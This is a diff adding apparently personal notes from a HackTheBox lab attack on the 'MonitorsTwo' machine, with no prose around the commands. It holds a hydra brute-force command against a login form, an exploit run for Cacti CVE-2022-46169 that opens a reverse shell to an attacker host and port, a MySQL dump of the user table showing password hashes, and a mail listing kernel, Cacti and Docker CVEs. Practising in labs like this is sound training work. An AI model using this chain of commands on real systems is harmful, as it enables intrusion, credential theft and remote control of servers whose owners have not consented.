@@ -1,0 +1,38 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.211 http-post-form "/index.php:login_username=admin&login_password=^PASS^:Access Denied! Login failed."
+
+Cacti 1.2.22
+python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.16.25 --LPORT=443
+www-data@50bca5e748b0:/$ mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
+< --password=root cacti -e "SELECT * FROM user_auth"
+id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list     show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange    lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
+1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on   on       on      on      on      2       1       1       1       1       on      -1      -1      -1              0       0       663348655
+3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1    11               -1      -1      -1              0       0       0
+4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb               on       on      on      on      1       1       1       1       1       on      -1      -1              on      0       0       2135691668
+
+admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC 
+guest:43e9a4ab75570f5b
+marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+
+marcus@monitorstwo:/var/mail$ cat marcus 
+From: administrator@monitorstwo.htb
+To: all@monitorstwo.htb
+Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
+
+Dear all,
+
+We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+
+CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+
+CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+
+CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+
+We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+
+Best regards,
+
+Administrator
+CISO
+Monitor Two
+Security Team
